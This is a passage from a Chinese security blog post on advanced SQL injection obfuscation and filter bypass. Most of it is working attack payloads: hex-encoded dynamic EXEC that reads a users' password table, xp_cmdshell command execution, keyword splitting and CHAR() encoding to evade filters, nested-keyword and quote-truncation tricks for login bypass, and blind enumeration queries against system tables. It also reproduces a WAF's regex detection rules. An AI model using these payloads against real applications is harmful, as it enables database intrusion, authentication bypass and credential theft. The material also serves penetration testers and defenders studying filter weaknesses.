+<h3 id="标识要执行的查询："><a href="#标识要执行的查询：" class="headerlink" title="标识要执行的查询："></a>标识要执行的查询：</h3><pre><code>SELECT @@VERSION
+</code></pre><h3 id="根据关键字CAST和CONVERT构造查询："><a href="#根据关键字CAST和CONVERT构造查询：" class="headerlink" title="根据关键字CAST和CONVERT构造查询："></a>根据关键字CAST和CONVERT构造查询：</h3><pre><code>SELECT CAST(&#39;SELECT @@VERSION&#39; AS VARCHAR(16))
+</code></pre><p>或者</p>
+<pre><code>SELECT CONVERT(VARCHAR,&#39;SELECT @@VERSION&#39;,1)
+</code></pre><h3 id="使用关键字EXEC执行查询："><a href="#使用关键字EXEC执行查询：" class="headerlink" title="使用关键字EXEC执行查询："></a>使用关键字EXEC执行查询：</h3><pre><code>SET @sqlcommand =  SELECT CONVERT(VARCHAR,&#39;SELECT @@VERSION&#39;,1)
+EXEC(@sqlcommand)
+</code></pre><p>或者首先将SELECT @@ VERSION转换为Hex</p>
+<pre><code>SET @sqlcommand =  (SELECT CAST(0x53454C45435420404076657273696F6E00 AS VARCHAR(34))
+EXEC(@sqlcommand)
+</code></pre><p>注意：了解CAST和CONVERT的创意。现在，由于句子CAST中包含的数据类型是十六进制的，因此执行varchar转换。</p>
+<p>您还可以使用嵌套的CAST和CONVERT查询来注入恶意输入。这样，您就可以开始在不同的编码类型之间进行交换，并创建更复杂的查询。这应该是一个很好的例子：</p>
+<pre><code>CAST(CAST(PAYLOAD IN HEX, VARCHAR(CHARACTER LENGTH OF PAYLOAD)),, VARCHAR(CHARACTER LENGTH OF TOTAL PAYLOAD)
+</code></pre><p>动态查询执行<br>许多数据库允许通过将包含SQL查询的字符串传递到执行查询的数据库函数来动态执行SQL查询。 如果您发现了一个有效的SQL注入点，但发现应用程序的输入过滤器阻止了您想要注入的查询，那么您可以使用动态执行来绕过过滤器。 动态查询执行在不同的数据库上有不同的</p>
+<p>在Microsoft SQL Server上，您可以使用EXEC函数以字符串形式执行查询。 例如：</p>
+<pre><code>&#39;EXEC xp_cmdshell ‘dir’; — Or &#39;UNION EXEC xp_cmdshell ‘dir’; —
+</code></pre><p>注意：使用EXEC功能，您可以枚举后端数据库中所有已启用的存储过程，并将已分配的权限映射到存储过程。</p>
+<p>在Oracle中，您可以使用EXECUTE IMMEDIATE命令以字符串形式执行查询。例如：</p>
+<pre><code>DECLARE pw VARCHAR2(1000);
+BEGIN
+EXECUTE IMMEDIATE &#39;SELECT password FROM tblUsers&#39; INTO pw;
+DBMS_OUTPUT.PUT_LINE(pw);
+END;
+</code></pre><p>注意：您可以逐行或全部一起执行该操作，当然，通过传递方法的其他过滤器可以与此结合使用。</p>
+<p>上述SQL注入攻击类型可以提交到Web应用程序攻击入口点，无论是上面呈现的方式，还是后端数据库接受批量查询（例如MSSQL）时由分号分隔的一批命令。</p>
+<p>例如在MSSQL中你可以这样做：</p>
+<pre><code>SET @MSSQLVERSION  = SELECT @@VERSION; EXEC (@MSSQLVERSION); --
+</code></pre><p>注意：可以从不同的Web应用程序入口点或相同的查询提交相同的查询。</p>
+<p>数据库提供了各种操作字符串的方法，使用动态执行来打败输入过滤器的关键是使用字符串操作函数将过滤器允许的输入转换为包含所需查询的字符串。 在最简单的情况下，您可以使用字符串连接从较小的部分构造字符串。 不同的数据库使用不同的语法进行字符串连接。</p>
+<p>例如，如果阻止SQL关键字SELECT，则可以按如下方式构造它。</p>
+<p>Oracle:</p>
+<pre><code>&#39;SEL&#39;||&#39;ECT&#39;
+</code></pre><p>MS-SQL:</p>
+<pre><code>&#39;SEL&#39;+&#39;ECT&#39;
+</code></pre><p>MySQL:</p>
+<pre><code>&#39;SEL&#39; &#39;ECT&#39;
+</code></pre><p>此SQL混淆方法的其他示例如下：</p>
+<p>Oracle:</p>
+<pre><code>UN’||’ION SEL&#39;||&#39;ECT NU’||’LL FR’||’OM DU’||’AL--
+</code></pre><p>MS-SQL:</p>
+<pre><code>&#39; un’+’ion (se’+’lect @@version) --
+</code></pre><p>MySQL:</p>
+<pre><code>&#39; SE’’LECT user(); #
+</code></pre><p>请注意，SQL Server使用+字符进行连接，而MySQL使用空格。 如果要在HTTP请求中提交这些字符，则需要将它们分别对其进行URL编码为％2b和％20。 更进一步，您可以使用CHAR函数（Oracle中的CHR）使用其ASCII字符代码构造单个字符。 例如，要在SQL Server上构造SELECT关键字，您可以使用：</p>
+<pre><code>CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
+</code></pre><p>注意：名为Hackbar的Firefox插件工具也会自动执行此操作（很长一段时间以来）</p>
+<p>您可以使用这种方式构造字符串，而无需使用任何引号字符。 如果您有一个SQL注入入口点，其中引号被阻止，您可以使用CHAR函数将字符串（例如“admin”）放入您的漏洞。 其他字符串操作函数也可能是有用的。 例如，Oracle包含函数REVERSE，TRANSLATE，REPLACE和SUBSTR。 在SQL Server平台上构造用于动态执行的字符串的另一种方法是从单个十六进制数字实例化一个字符串，该数字表示字符串的ASCII字符代码。 例如，字符串：</p>
+<pre><code>SELECT password FROM tblUsers
+</code></pre><p>可以构造和动态执行如下：</p>
+<pre><code>DECLARE @query VARCHAR(100)
+SELECT @query = 0x53454c4543542070617373776f72642046524f4d2074626c5573657273
+EXEC(@query)
+</code></pre><p>注意：2008年初开始的针对Web应用程序的大规模SQL注入攻击采用了这种技术，以减少被攻击的应用程序中的输入过滤器阻止其漏洞利用代码的可能性。</p>
+<h2 id="空字节"><a href="#空字节" class="headerlink" title="空字节"></a>空字节</h2><p>通常，为了利用SQL注入漏洞而需要绕过的输入过滤器是在应用程序自己的代码之外，入侵检测系统（IDS）或WAF中实现的。出于性能原因，这些组件通常使用本机代码语言编写，例如C ++。在这种情况下，您通常可以使用空字节攻击来规避输入过滤器并将您的漏洞利用到后端应用程序中。</p>
+<p>由于在本机代码和托管代码中处理空字节的不同方式，空字节攻击起作用。在本机代码中，字符串的长度由字符串开头的第一个空字节的位置确定 - 空字节有效地终止字符串。另一方面，在托管代码中，字符串对象包含字符数组（可能包含空字节）和字符串长度的单独记录。这种差异意味着当本机过滤器处理您的输入时，它可能在遇到空字节时停止处理输入，因为这表示就过滤器而言字符串的结尾。如果空字节之前的输入是良性的，则过滤器不会阻止输入。</p>
+<p>但是，当应用程序处理相同的输入时，在托管代码上下文中，将处理空字节后面的完整输入，从而允许执行您的漏洞利用。要执行空字节攻击，您只需在过滤器阻塞的任何字符之前提供URL编码的空字节（看起来像这样）。在原始示例中，您可以使用攻击字符串绕过本机输入过滤器，如下所示：</p>
+<pre><code>&#39; UNION SELECT password FROM tblUsers WHERE username=&#39;admin&#39;--
+</code></pre><p>注意：当访问用作银行结束数据库时，NULL字节可用作SQL查询分隔符。</p>
+<p>嵌套剥离表达式</p>
+<p>某些清理过滤器会从用户输入中删除某些字符或表达式，然后以常规方式处理剩余数据。 如果正在被剥离的表达式包含两个或多个字符，并且未以递归方式应用过滤器，则通常可以通过将禁止的表达式嵌套在其自身内来使过滤器失败。</p>
+<p>例如，如果从输入中删除SQL关键字SELECT，则可以使用以下输入来阻止过滤器：</p>
+<pre><code>SELSELECTECT
+</code></pre><p>注意：请参阅绕过愚蠢过滤器的简单性。</p>
+<h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>清理过滤器通常对用户提供的数据执行多个操作，有时其中一个步骤是将输入截断为最大长度，可能是为了防止缓冲区溢出攻击，或者在具有预定义最大长度的数据库字段中容纳数据 。考虑一个登录函数，它执行以下SQL查询，包含两项用户提供的输入：</p>
+<pre><code>SELECT uid FROM tblUsers WHERE username = &#39;jlo&#39; AND password = &#39;r1Mj06&#39;
+</code></pre><p>假设应用程序使用清理过滤器，它执行以下步骤：</p>
+<p>将引号加倍，用两个单引号（“）替换单引号（’）的每个实例</p>
+<p>将每个项目截断为16个字符。 如果您提供典型的SQL注入攻击向量，例如：</p>
+<pre><code>admin&#39;--
+</code></pre><p>将执行以下查询，您的攻击将失败：</p>
+<pre><code>SELECT uid FROM tblUsers WHERE username = &#39;admin&#39;&#39;--&#39; AND password = &#39;&#39;
+</code></pre><p>双引号表示您的输入无法终止用户名字符串，因此查询实际上会检查具有您提供的文字用户名的用户。 但是，如果您提供包含15个和一个引号的用户名aaaaaaaaaaaaaa’，则应用程序首先将引号加倍，生成17个字符的字符串，然后通过截断为16个字符来删除其他引号。 这使您可以将未转义的引号走私到查询中，从而干扰其语法：</p>
+<pre><code>SELECT uid FROM tblUsers WHERE username = &#39;aaaaaaaaaaaaaaa&#39;&#39; AND password = &#39;&#39;
+</code></pre><p>注意：此初始攻击会导致错误，因为您实际上有一个未终止的字符串。</p>
+<p>a后面的每对引号代表一个转义引号，并且没有最终引号来分隔用户名字符串。 但是，因为您有第二个插入点，所以在密码字段中，您可以通过提供以下密码来恢复查询的语法有效性并绕过登录：</p>
+<pre><code>or 1=1--
+</code></pre><p>这会导致应用程序执行以下查询：</p>
+<pre><code>SELECT uid FROM tblUsers WHERE username = &#39;aaaaaaaaaaaaaaa&#39;&#39; AND password = &#39;or 1=1--&#39;
+</code></pre><p>当数据库执行此查询时，它会检查文字用户名为的表条目：</p>
+<pre><code>aaaaaaaaaaaaaaa&#39; AND password =
+</code></pre><p>这可能总是假的，或者1 = 1，这总是正确的。 因此，查询将返回表中每个用户的UID，通常会导致应用程序将您作为表中的第一个用户登录。 要以特定用户身份登录（例如，使用UID 0），您将提供以下密码：</p>
+<pre><code>or uid=0--
+</code></pre><p>注意：此查询被认为是用于身份验证绕过或权限提升的非常古老的技术。</p>
+<h2 id="更高级的"><a href="#更高级的" class="headerlink" title="更高级的"></a>更高级的</h2><p>基于Regexp的WAF:</p>
+<pre><code>(?:)\swhen\s\d+\sthen)|(?:&quot;\s(?:#|--|{))|(?:\/*!\s?\d+)|(?:ch(?:a)?r\s(\s\d)|(?:(?:(n?and|x?or|not)\s+||||\&amp;\&amp;)\s\w+()
+(?:[\s()]case\s()|(?:)\slike\s()|(?:having\s[^\s]+\s[^\w\s])|(?:if\s?([\d\w]\s[=&lt;&gt;~])
+(?:&quot;\sor\s&quot;?\d)|(?:\x(?:23|27|3d))|(?:^.?&quot;$)|(?:(?:^[&quot;\](?:[\d&quot;]+|[^&quot;]+&quot;))+\s(?:n?and|x?or|not||||\&amp;\&amp;)\s[\w&quot;[+&amp;!@(),.-])|(?:[^\w\s]\w+\s[|-]
+\s&quot;\s\w)|(?:@\w+\s+(and|or)\s[&quot;\d]+)|(?:@[\w-]+\s(and|or)\s[^\w\s])|(?:[^\w\s:]\s\d\W+[^\w\s]\s&quot;.)|(?:\Winformation_schema|table_name\W)
+(?:&quot;\s*.+(?:or|id)\W&quot;\d)|(?:\^&quot;)|(?:^[\w\s&quot;-]+(?&lt;=and\s)(?&lt;=or\s)(?&lt;=xor\s)(?&lt;=nand\s)(?&lt;=not\s)(?&lt;=||)(?&lt;=\&amp;\&amp;)\w+()|(?:&quot;[\s\d][^\w\s]+\W\d
+\W.[&quot;\d])|(?:&quot;\s[^\w\s?]+\s[^\w\s]+\s&quot;)|(?:&quot;\s[^\w\s]+\s[\W\d].(?:#|--))|(?:&quot;.*\s\d)|(?:&quot;\sor\s[^\d]+[\w-]+.\d)|(?:[()&lt;&gt;%+-][\w-]+[^\w\s]
++&quot;[^,])
+(?:\d&quot;\s+&quot;\s+\d)|(?:^admin\s&quot;|(\/*)+&quot;+\s?(?:--|#|\/*|{)?)|(?:&quot;\sor[\w\s-]+\s[+&lt;&gt;=(),-]\s[\d&quot;])|(?:&quot;\s[^\w\s]?=\s&quot;)|(?:&quot;\W[+=]+\W&quot;)|(?:&quot;\s[!=|]
+[\d\s!=+-]+.[&quot;(].$)|(?:&quot;\s[!=|][\d\s!=]+.\d+$)|(?:&quot;\slike\W+[\w&quot;(])|(?:\sis\s0\W)|(?:where\s[\s\w.,-]+\s=)|(?:&quot;[&lt;&gt;~]+&quot;)
+(?:union\s(?:all|distinct|[(!@])?\s[([]\sselect)|(?:\w+\s+like\s+\&quot;)|(?:like\s&quot;\%)|(?:&quot;\slike\W[&quot;\d])|(?:&quot;\s(?:n?and|x?or|not ||||\&amp;\&amp;)\s+[\s
+\w]+=\s\w+\shaving)|(?:&quot;\s*\s\w+\W+&quot;)|(?:&quot;\s[^?\w\s=.,;)(]+\s[(@&quot;]\s\w+\W+\w)|(?:select\s[[]()\s\w.,&quot;-]+from)|(?:find_in_set\s()
+(?:in\s(+\sselect)|(?:(?:n?and|x?or|not ||||\&amp;\&amp;)\s+[\s\w+]+(?:regexp\s(|sounds\s+like\s&quot;|[=\d]+x))|(&quot;\s\d\s(?:--|#))|(?:&quot;[%&amp;&lt;&gt;^=]+\d\s(=|
+or))|(?:&quot;\W+[\w+-]+\s=\s\d\W+&quot;)|(?:&quot;\sis\s\d.+&quot;?\w)|(?:&quot;|?[\w-]{3,}[^\w\s.,]+&quot;)|(?:&quot;\sis\s[\d.]+\s\W.&quot;)
+(?:[\d\W]\s+as\s[&quot;\w]+\sfrom)|(?:^[\W\d]+\s(?:union|select|create|rename|truncate|load|alter|delete|update|insert|desc) )|(?:(?:select|create|rename|
+truncate|load|alter|delete|update|insert|desc)\s+(?:(?:group_)concat|char|load_f ile)\s?(?)|(?:end\s);)|(&quot;\s+regexp\W)|(?:[\s(]load_file\s()
+(?:@.+=\s(\sselect)|(?:\d+\sor\s\d+\s[-+])|(?:\/\w+;?\s+(?:having|and|or|select)\W)|(?:\d\s+group\s+by.+()|(?:(?:;|#|--)\s(?:drop|alter))|(?:
+(?:;|#|--)\s(?:update|insert)\s\w{2,})|(?:[^\w]SET\s@\w+)|(?:(?:n?and|x?or|not ||||\&amp;\&amp;)[\s(]+\w+[\s)][!=+]+[\s\d][&quot;=()])
+(?:&quot;\s+and\s=\W)|(?:(\sselect\s\w+\s()|(?:*\/from)|(?:+\s\d+\s+\s@)|(?:\w&quot;\s(?:[-+=|@]+\s)+[\d(])|(?:coalesce\s(|@@\w+\s[^\w\s])|(?:\W!
++&quot;\w)|(?:&quot;;\s(?:if|while|begin))|(?:&quot;[\s\d]+=\s\d)|(?:order\s+by\s+if\w\s()|(?:[\s(]+case\d\W.+[tw]hen[\s(])
+(?:(select|;)\s+(?:benchmark|if|sleep)\s?(\s(?\s\w+)
+(?:create\s+function\s+\w+\s+returns)|(?:;\s(?:select|create|rename|truncate|lo ad|alter|delete|update|insert|desc)\s(
+(?:alter\s\w+.character\s+set\s+\w+)|(&quot;;\swaitfor\s+time\s+&quot;)|(?:&quot;;.:\sgoto)
+(?:procedure\s+analyse\s()|(?:;\s(declare|open)\s+[\w-]+)|(?:create\s+(procedure|function)\s\w+\s(\s)\s-)|(?:declare[^\w]+[@#]\s\w+)|(exec\s\
+(\s@)
+(?:select\spg_sleep)|(?:waitfor\sdelay\s?&quot;+\s?\d)|(?:;\sshutdown\s(?:;|--|#|\/*|{))
+(?:*ec\s+xp_cmdshell)|(?:&quot;\s!\s[&quot;\w])|(?:from\W+informationschema\W)|(?:(?:(?:current)?user|database|schema|connec tion_id)\s([^)])|(?:&quot;;?
+\s(?:select|union|having)\s[^\s])|(?:\wiif\s()|(?:exec\s+master.)|(?:union select @)|(?:union[\w(\s]select)|(?:select.\w?user()|(?:into[\s+]+
+(?:dump|out)file\s&quot;)
+(?:merge.using\s()|(execute\simmediate\s&quot;)|(?:\W+\d\shaving\s[^\s-])|(?:match\s[\w(),+-]+\sagainst\s()
+(?:,.[)\da-f&quot;]&quot;(?:&quot;.&quot;|\Z|[^&quot;]+))|(?:\Wselect.+\Wfrom)|((?:select|create|rename|truncate|load|alter|delete|up date|insert|desc)\s(\sspace\s()
+(?:[\$(?:ne|eq|lte?|gte?|n?in|mod|all|size|exists|type|slice|or)])
+(?:(sleep((\s)(\d)(\s))|benchmark((.)\,(.))))
+(?:(union(.)select(.)from))
+(?:^(-0000023456|4294967295|4294967296|2147483648|2147483647|0000012345|-2147483648|-2147483649|0000023456|2.2250738585072007e-308|1e309)$)
+</code></pre><h3 id="NULL的别名"><a href="#NULL的别名" class="headerlink" title="NULL的别名"></a>NULL的别名</h3><p>在MySQL中，NULL可以写为\ N区分大小写。 \ n不是null。<br>这意味着任何在用户输入上执行“to_lower”并查找“null”的WAF将错过这种情况。</p>
+<h3 id="浮点"><a href="#浮点" class="headerlink" title="浮点"></a>浮点</h3><pre><code>digits
+digits[.]
+digits[.]digits
+digits[eE]digits
+digits[eE][+-]digits
+digits[.][eE]digits
+digits[.]digits[eE]digits
+digits[.]digits[eE][+-]digits
+[.]digits
+[.]digits[eE]digits
+[.]digits[eE][+-]digits
+</code></pre><p>可选以[+ - ]开头</p>
+<p>例外：1.AND 2（“1.”“AND”之间没有空格）一些解析器接受，有些则不接受。 1e1 vs. 1e1.0？未定义</p>
+<p>十六进制文字</p>
+<pre><code>0xDEADbeef
+</code></pre><p>0x区分大小写。</p>
+<p>二进制文字</p>
+<pre><code>b&#39;10101010&#39;    
+0b010101
+</code></pre><p>C风格字符串合并</p>
+<p>C风格的连续字符串合并为一个。</p>
+<pre><code>SELECT &#39;foo&#39; &quot;bar&quot;;
+
+Ad-Hoc Charset
+
+_charset&#39;....&#39;    
+_latin1&#39;.....&#39;    
+_utf8&#39;....&#39;
+</code></pre><p>Operators</p>
+<pre><code>!=, &lt;=&gt;
+</code></pre><h3 id="表达"><a href="#表达" class="headerlink" title="表达"></a>表达</h3><p>使用“OR 1 = 1”的公共查询扩展名。 除了使用文字之外，还可以使用函数：</p>
+<pre><code>COS（0）= SIN（PI（）/ 2）    
+COS（@VERSION）= -SIN（@VERSION + PI（）/ 2）
+</code></pre><p>ESP：</p>
+<p>正常的SQL注入：</p>
+<pre><code>1 OR 1=1
+</code></pre><p>使用封装数据的正常SQL注入：</p>
+<pre><code>1&#39; OR &#39;1&#39;=&#39;1
+</code></pre><p>盲SQL注入以抛出错误以验证封装不起作用。 这里的目标是抛出一个错误，使应用程序向我们显示它没有正确封装引号：</p>
+<pre><code>1&#39;1
+</code></pre><p>使用EXEC创建错误的盲SQL注入：</p>
+<pre><code>1 EXEC SP (or EXEC XP)
+</code></pre><p>盲SQL注入检测（如果我们排除了AND 1 = 1部分，那么如果我们得到过滤就不会给我们相同的结果。如果它确实给我们相同的结果它表明应用程序易受攻击）：</p>
+<pre><code>1 AND 1=1
+</code></pre><p>盲注SQL注入尝试通过潜在的名称进行强力迭代来定位表名（您必须重命名表名，直到找到匹配项）：</p>
+<pre><code>1&#39; AND 1=(SELECT COUNT(*) FROM tablenames); --
+</code></pre><p>使用反斜杠避开逃逸（这假定应用程序使用另一个单引号注释掉单引号，并在它之前引入反斜杠，它会注释掉过滤器添加的单引号）。 这种类型的过滤器由mySQL的mysql_real_escape_string（）和PERL的DBD方法$ dbh-&gt; quote（）应用：</p>
+<pre><code>\&#39;; DESC users; --
+</code></pre><p>通过尝试使用上面看到的反斜杠方法创建错误来更盲目的SQL注入：</p>
+<pre><code>1\&#39;1
+</code></pre><p>通过调用伪表创建错误。 这可以通过调用不存在的表来尝试创建错误来帮助公开易受攻击的应用程序（尝试使用和不使用引号）：</p>
+<pre><code>1&#39; AND non_existant_table = &#39;1
+</code></pre><p>枚举数据库表名。 通过将116更改为不同的数字，您可以使用logrithmic reduction来查找数据库表名的第一个char。 然后迭代第一个1中的1，你最终可以获得整个表名。</p>
+<pre><code>1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype=&#39;U&#39;), 1, 1))) 116
+</code></pre><p>使用SQL Server中的sysObjects表查找用户提供的表：</p>
+<pre><code>1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = &#39;U&#39; --
+</code></pre><blockquote>
+<p>转载地址：<a href="https://xcroot.com/HelloWord/41.sh" target="_blank" rel="noopener">https://xcroot.com/HelloWord/41.sh</a></p>
+</blockquote>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2019/10/02/高级SQL注入：混淆和绕过/">高级SQL注入：混淆和绕过</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 Elapse 的个人博客">Elapse</a></p>
+        <p><span>发布时间:</span>2019年10月02日 - 22时05分</p>
+        <p><span>最后更新:</span>2020年02月06日 - 15时22分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/10/02/高级SQL注入：混淆和绕过/" title="高级SQL注入：混淆和绕过">https://Ernket.github.io/2019/10/02/高级SQL注入：混淆和绕过/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://Ernket.github.io/2019/10/02/高级SQL注入：混淆和绕过/　　作者: Elapse" title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2019/10/02/zhong-guo-cai-dao-fen-xi/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          中国菜刀-分析
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/2019/08/15/wang-lu-yu-xin-xi-an-quan-ling-yu-zhuan-xiang-sai-web-writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">网路与信息安全领域专项赛-Web Writeup</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#目录"><span class="toc-number">1.</span> <span class="toc-text">目录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#【0×01】-–-简介"><span class="toc-number">1.1.</span> <span class="toc-text">【0×01】 – 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【0×01】-过滤规避（Mysql）"><span class="toc-number">1.2.</span> <span class="toc-text">【0×01】 -过滤规避（Mysql）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#【0x01a】-–-绕过函数和关键词过滤"><span class="toc-number">1.2.1.</span> <span class="toc-text">【0x01a】 – 绕过函数和关键词过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#【0x01b】-–-绕过正则表达式过滤"><span class="toc-number">1.2.2.</span> <span class="toc-text">【0x01b】 – 绕过正则表达式过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【0x02】-常见绕过技术"><span class="toc-number">1.3.</span> <span class="toc-text">【0x02】 - 常见绕过技术</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#现实例子"><span class="toc-number">2.</span> <span class="toc-text">现实例子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#高级绕过"><span class="toc-number">3.</span> <span class="toc-text">高级绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过SQL注入过滤器"><span class="toc-number">3.1.</span> <span class="toc-text">绕过SQL注入过滤器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大小写变化"><span class="toc-number">3.2.</span> <span class="toc-text">大小写变化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注释"><span class="toc-number">3.3.</span> <span class="toc-text">SQL注释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL编码"><span class="toc-number">3.4.</span> <span class="toc-text">URL编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CAST和CONVERT关键字"><span class="toc-number">3.5.</span> <span class="toc-text">CAST和CONVERT关键字</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#标识要执行的查询："><span class="toc-number">3.5.1.</span> <span class="toc-text">标识要执行的查询：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#根据关键字CAST和CONVERT构造查询："><span class="toc-number">3.5.2.</span> <span class="toc-text">根据关键字CAST和CONVERT构造查询：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用关键字EXEC执行查询："><span class="toc-number">3.5.3.</span> <span class="toc-text">使用关键字EXEC执行查询：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#空字节"><span class="toc-number">3.6.</span> <span class="toc-text">空字节</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#截断"><span class="toc-number">3.6.1.</span> <span class="toc-text">截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#更高级的"><span class="toc-number">3.7.</span> <span class="toc-text">更高级的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NULL的别名"><span class="toc-number">3.7.1.</span> <span class="toc-text">NULL的别名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#浮点"><span class="toc-number">3.7.2.</span> <span class="toc-text">浮点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#表达"><span class="toc-number">3.7.3.</span> <span class="toc-text">表达</span></a></li></ol></li></ol></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2019/10/02/zhong-guo-cai-dao-fen-xi/" title="上一篇: 中国菜刀-分析">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2019/08/15/wang-lu-yu-xin-xi-an-quan-ling-yu-zhuan-xiang-sai-web-writeup/" title="下一篇: 网路与信息安全领域专项赛-Web Writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/10/24/RBash-受限的Bash绕过/">RBash - 受限的Bash绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/24/rhcenotescollation/">RHCE培训笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/ji-yu-python3-de-mu-ma-lian-jie-gong-ju-bian-xie/">基于Python3的木马连接工具编写</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/02/zhong-guo-cai-dao-fen-xi/">中国菜刀-分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/02/高级SQL注入：混淆和绕过/">高级SQL注入：混淆和绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/15/wang-lu-yu-xin-xi-an-quan-ling-yu-zhuan-xiang-sai-web-writeup/">网路与信息安全领域专项赛-Web Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/10/minuv1-ba-ji-shen-tou/">MinUv1靶机渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/07/de1ctf-ssrf-me_writeup/">De1CTF-SSRF Me_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/31/2019强网杯Upload题Writeup/">2019强网杯Upload题Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/24/php-serialize/">PHP反序列化漏洞学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/18/python3-qi-dian-zhong-wen-wang-pa-chong/">Python3 起点中文网爬虫</a></li><li class="post-list-item"><a 